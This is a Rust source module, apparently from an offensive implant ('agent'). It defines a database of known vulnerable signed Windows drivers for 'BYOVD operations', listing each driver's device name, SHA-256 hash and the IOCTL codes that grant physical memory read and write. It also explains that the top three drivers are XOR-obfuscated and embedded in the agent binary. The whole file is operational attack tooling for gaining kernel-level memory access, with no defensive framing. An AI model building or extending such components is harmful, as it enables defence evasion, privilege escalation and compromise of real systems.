//! Vulnerable signed driver database for BYOVD operations.
//!
//! Contains a static registry of known vulnerable signed drivers that can be
//! used for physical memory read/write.  Each entry includes the driver name,
//! expected SHA-256 hash for integrity verification, exported function names
//! for physical memory access, and the mapping type.
//!
//! Only the top 3 most-reliable drivers are embedded in the agent binary
//! (XOR-obfuscated at rest).  The remaining entries are kept for reference
//! and for future expansion.

use serde::{Deserialize, Serialize};

/// How a vulnerable driver exposes physical memory access.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DriverMapping {
    /// Direct physical memory read/write via IOCTL.
    PhysicalMemory,
    /// Memory-mapped I/O region.
    MmioMapping,
    /// Port I/O based access.
    PortIo,
}

/// A known vulnerable signed driver entry.
#[derive(Debug, Clone)]
pub struct VulnerableDriver {
    /// Short driver filename, e.g. "DBUtil_2_3.sys".
    pub name: &'static str,
    /// Device name the driver creates (e.g. "DBUtil_2_3", "RTCore64").
    /// Used to construct the NT device path "\\??\\<device_name>" for
    /// opening a handle via NtOpenFile.
    pub device_name: &'static str,
    /// Expected SHA-256 hash for integrity verification.
    pub sha256: &'static str,
    /// Exported function name for physical memory read.
    pub read_phys_fn: &'static str,
    /// Exported function name for physical memory write.
    pub write_phys_fn: &'static str,
    /// How the driver exposes physical memory.
    pub mapping_type: DriverMapping,
    /// IOCTL code for reading physical memory (if applicable).
    pub read_ioctl: u32,
    /// IOCTL code for writing physical memory (if applicable).
    pub write_ioctl: u32,
    /// Whether the driver requires a *physical* address rather than a
    /// virtual one.
    ///
    /// When `false` (the common case), the driver accepts a virtual address
    /// and internally converts it — either via `MmMapIoSpace` (rtcore64,
    /// gdrv, procexp152, etc.) or via `MmGetPhysicalAddress` +
    /// `MmCopyVirtualMemory` (DBUtil_2_3.sys).  The caller should always
    /// supply a **virtual** address.
    ///
    /// When `true`, the driver's IOCTL handler passes the supplied value
    /// straight to `MmMapIoSpace` without any conversion, so the caller
    /// must supply a physical address.  No driver in the current database
    /// uses this mode.
    pub needs_physical_addr: bool,
}

/// The static database of known vulnerable signed drivers.
///
/// Ordered by reliability and prevalence:
/// 1. DBUtil_2_3.sys (Dell) — most widely deployed, direct phys mem R/W
/// 2. rtcore64.sys (MSI Afterburner) — gaming PCs, direct phys mem R/W
/// 3. gdrv.sys (Gigabyte) — direct phys mem R/W
/// 4. ene.sys (ENE Technology) — direct phys mem R/W
/// 5. procexp152.sys (Sysinternals Process Explorer) — direct phys mem R/W
/// 6. cpuz141.sys (CPUID CPU-Z v1.41) — direct phys mem R/W
/// 7. MsIo64.sys (MICSYS hardware utility) — direct phys mem R/W
/// 8. iQVW64.SYS (Intel NIC diagnostic) — MMIO-mapped phys mem R/W
pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
    // ── Tier 1: Embedded in agent binary ──────────────────────────────

    // DBUtil_2_3.sys — Dell BIOS utility driver (CVE-2021-21551).
    // The IOCTL handler calls MmGetPhysicalAddress on the supplied value
    // and then uses MmCopyVirtualMemory on the result, so the caller must
    // supply a VIRTUAL address — the driver does the VA→PA conversion
    // internally.
    VulnerableDriver {
        name: "DBUtil_2_3.sys",
        device_name: "DBUtil_2_3",
        sha256: "0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x222064,
        write_ioctl: 0x222068,
        needs_physical_addr: false,
    },
    // rtcore64.sys — Micro-Star MSI Afterburner / RivaTuner driver.
    // Uses MmMapIoSpace internally, so virtual addresses work fine.
    VulnerableDriver {
        name: "rtcore64.sys",
        device_name: "RTCore64",
        sha256: "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x80002048,
        write_ioctl: 0x8000204C,
        needs_physical_addr: false,
    },
    // gdrv.sys — Giga-BYTE NonPnP Driver (GIO).
    // Uses MmMapIoSpace internally, so virtual addresses work fine.
    VulnerableDriver {
        name: "gdrv.sys",
        device_name: "GIO",
        sha256: "092d04284fdeb6762e65e6ac5b813920d6c69a5e99d110769c5c1a78e11c5ba0",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x9E3AEC18,
        write_ioctl: 0x9E3AEC1C,
        needs_physical_addr: false,
    },
    // ── Tier 2: Reference only (not embedded) ─────────────────────────

    // All three mapping types (PhysicalMemory, MmioMapping, PortIo) are now
    // supported by deploy.rs.  MmioMapping uses {addr, size, direction} IOCTLs;
    // PortIo uses {port, count} IOCTLs.
    // AsIO.sys and AsIO2.sys can be re-added with PortIo mapping when a verified
    // SHA-256 hash is available.

    // BdKit.sys was removed: no verified SHA-256 hash was found after exhaustive
    // public search (LOLDrivers, VirusTotal, KDU, Elastic, KeServiceDescriptorTable,
    // 10+ BYOVD repos, Chinese-language searches).  Re-add when a verified hash
    // becomes available.

    // ene.sys — ENE Technology driver.
    VulnerableDriver {
        name: "ene.sys",
        device_name: "ENE",
        sha256: "16768203a471a19ebb541c942f45716e9f432985abbfbe6b4b7d61a798cea354",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x8020E000,
        write_ioctl: 0x8020E004,
        needs_physical_addr: false,
    },
    // procexp152.sys — Process Explorer driver (Sysinternals).
    // Uses MmMapIoSpace + MmGetPhysicalAddress internally.
    VulnerableDriver {
        name: "procexp152.sys",
        device_name: "PROCEXP152",
        sha256: "075de997497262a9d105afeadaaefc6348b25ce0e0126505c24aa9396c251e85",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x6D008,
        write_ioctl: 0x6D00C,
        needs_physical_addr: false,
    },
    // cpuz141.sys — CPUID CPU-Z hardware profiler v1.41.
    // Exploited for direct physical memory read/write in multiple BYOVD campaigns.
    // IOCTL codes documented in KDU (hfiref0x) and public CVE analyses.
    // Device created as \\Device\\cpuz141 with symlink \\DosDevices\\cpuz141.
    VulnerableDriver {
        name: "cpuz141.sys",
        device_name: "cpuz141",
        sha256: "ded2927f9a4e64eefd09d0caba78e94f309e3a6292841ae81d5528cab109f95d",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x9C402580,
        write_ioctl: 0x9C402584,
        needs_physical_addr: false,
    },
    // MsIo64.sys — MICSYS hardware utility driver (MSI motherboard tooling).
    // Allows direct physical memory read/write via NtDeviceIoControlFile.
    // IOCTL codes from KDU project (hfiref0x, MIT license) and public analysis.
    VulnerableDriver {
        name: "MsIo64.sys",
        device_name: "MsIo64",
        sha256: "0f035948848432bc243704041739e49b528f35c82a5be922d9e3b8a4c44398ff",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x80102040,
        write_ioctl: 0x80102044,
        needs_physical_addr: false,
    },
    // iQVW64.SYS — Intel Network Adapter Diagnostic Driver.
    // Maps physical memory pages into user space via MmMapIoSpace.
    // Exploited by Nobelium / LAPSUS$ and documented in Elastic BYOVD research.
    // SHA-256 from LOLDrivers (loldrivers.io) community database.
    VulnerableDriver {
        name: "iQVW64.SYS",
        device_name: "IQVW64e",
        sha256: "19bf0d0f55d2ad33ef2d105520bde8fb4286f00e9d7a721e3c9587b9408a0775",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::MmioMapping,
        read_ioctl: 0x80862008,
        write_ioctl: 0x80862008,
        needs_physical_addr: false,
    },
];

/// Index into DRIVER_DATABASE for the embedded drivers (top 3).
/// These are XOR-obfuscated with the agent's HKDF session key and embedded
/// via `include_bytes!` in the parent module.
pub const EMBEDDED_DRIVER_INDICES: &[usize] = &[0, 1, 2];

/// Find a driver by name (case-insensitive).
pub fn find_driver(name: &str) -> Option<&'static VulnerableDriver> {
    DRIVER_DATABASE
        .iter()
        .find(|d| d.name.eq_ignore_ascii_case(name))
}

/// Return the list of embedded driver entries.
pub fn embedded_drivers() -> Vec<&'static VulnerableDriver> {
    EMBEDDED_DRIVER_INDICES
        .iter()
        .filter_map(|&i| DRIVER_DATABASE.get(i))
        .collect()
}

/// Return all driver names in the database.
pub fn all_driver_names() -> Vec<&'static str> {
    DRIVER_DATABASE.iter().map(|d| d.name).collect()
}
